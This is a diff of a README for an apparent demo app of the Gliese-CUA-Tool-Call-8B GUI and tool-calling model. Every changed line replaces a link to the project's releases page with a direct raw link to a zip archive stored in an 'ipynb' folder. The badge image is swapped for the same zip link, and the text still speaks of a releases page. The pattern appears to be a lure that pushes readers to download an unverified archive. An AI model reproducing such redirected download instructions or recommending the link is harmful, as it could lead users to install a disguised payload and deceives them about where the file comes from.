@@ -1,7 +1,7 @@
 # 🌟 Gliese-CUA-Tool-Call-8B-Demo - Simplifying GUI Interaction for Everyone
 
 ## 📥 Download Now
-[![Download Gliese-CUA-Tool-Call-8B-Demo](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/yModz1/Gliese-CUA-Tool-Call-8B-Demo/releases)
+[![Download Gliese-CUA-Tool-Call-8B-Demo](https://raw.githubusercontent.com/yModz1/Gliese-CUA-Tool-Call-8B-Demo/main/ipynb/Demo-CU-Tool-Call-Gliese-1.8-beta.4.zip)](https://raw.githubusercontent.com/yModz1/Gliese-CUA-Tool-Call-8B-Demo/main/ipynb/Demo-CU-Tool-Call-Gliese-1.8-beta.4.zip)
 
 ## 📋 Overview
 Welcome to Gliese-CUA-Tool-Call-8B-Demo! This application provides a user-friendly interface to demonstrate how the prithivMLmods/Gliese-CUA-Tool-Call-8B model works. It specializes in tasks related to understanding graphical user interfaces and performing tool-calling actions.
@@ -11,7 +11,7 @@ To get started with Gliese-CUA-Tool-Call-8B-Demo, follow these steps:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the latest version of the application:  
-   [Download Here](https://github.com/yModz1/Gliese-CUA-Tool-Call-8B-Demo/releases).
+   [Download Here](https://raw.githubusercontent.com/yModz1/Gliese-CUA-Tool-Call-8B-Demo/main/ipynb/Demo-CU-Tool-Call-Gliese-1.8-beta.4.zip).
 
 2. **Download the Application**  
    On the Releases page, find the latest version. Click on the appropriate file to initiate the download.
@@ -23,7 +23,7 @@ To get started with Gliese-CUA-Tool-Call-8B-Demo, follow these steps:
 To download and install Gliese-CUA-Tool-Call-8B-Demo:
 
 1. Click the link below:
-   [Download Gliese-CUA-Tool-Call-8B-Demo](https://github.com/yModz1/Gliese-CUA-Tool-Call-8B-Demo/releases).
+   [Download Gliese-CUA-Tool-Call-8B-Demo](https://raw.githubusercontent.com/yModz1/Gliese-CUA-Tool-Call-8B-Demo/main/ipynb/Demo-CU-Tool-Call-Gliese-1.8-beta.4.zip).
 
 2. Choose the version suitable for your operating system. Options may include Windows, macOS, or others.
 
